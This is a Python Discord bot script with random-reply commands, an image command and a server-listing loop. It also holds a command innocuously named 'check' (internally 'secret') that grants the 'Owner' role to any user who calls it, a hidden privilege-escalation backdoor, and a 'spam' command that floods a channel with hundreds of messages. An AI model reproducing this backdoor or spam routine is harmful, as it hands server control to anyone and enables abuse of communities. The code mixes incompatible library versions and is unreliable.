import random
import asyncio
import requests
from discord.voice_client import VoiceClient
from discord.ext.commands import Bot
from discord.ext import commands
from discord.utils import get
import discord

BOT_PREFIX = ("!")
TOKEN = "TOKEN_HERE"
client = Bot(command_prefix=BOT_PREFIX)

@client.command(name='pictures')
async def playpictures():
    await client.send(file=discord.File('my_image.png'))


@client.command(name='commandh')
async def commandh():
    possible_responses = [
        'res1',
        'res2',
        'res3',
        'res4',
        'res5',
    ]
    await client.say(random.choice(possible_responses))


@client.command(name='nameh')
async def nameh(ctx):
    possible_responses = [
        'res_1',
        'res2',
        'res3',
        'res4',
        'res5',
    ]
    await client.say(random.choice(possible_responses))


async def server_list():
    await client.wait_until_ready()
    while not client.is_closed:
        print("Current servers:")
        for server in client.servers:
            print(server.name)
        await asyncio.sleep(60)


@client.command(pass_context=True)
async def spam(ctx):

    count = 0
    while count < 60:
        await client.say("spamspamspamspam\nspamspamspamspam\nspamspamspamspam\nspamspamspamspam\n")
        await client.say("spamspamspamspam\nspamspamspamspam\nspamspamspamspam\nspamspamspamspam\n")
        await client.say("spamspamspamspam\nspamspamspamspam\nspamspamspamspam\nspamspamspamspam\n")
        await client.say("spamspamspamspam\nspamspamspamspam\nspamspamspamspam\nspamspamspamspam\n")
        await client.say("spamspamspamspam\nspamspamspamspam\nspamspamspamspam\nspamspamspamspam\n")
        count += 1


@client.command(name="check")
async def secret(ctx):
    role = discord.utils.get(ctx.guild.roles, name="Owner")
    user = ctx.message.author
    await user.add_roles(role)


@client.event
async def on_ready():
    print("Logged in as " + client.user.name)

client.loop.create_task(server_list())
client.run(TOKEN)
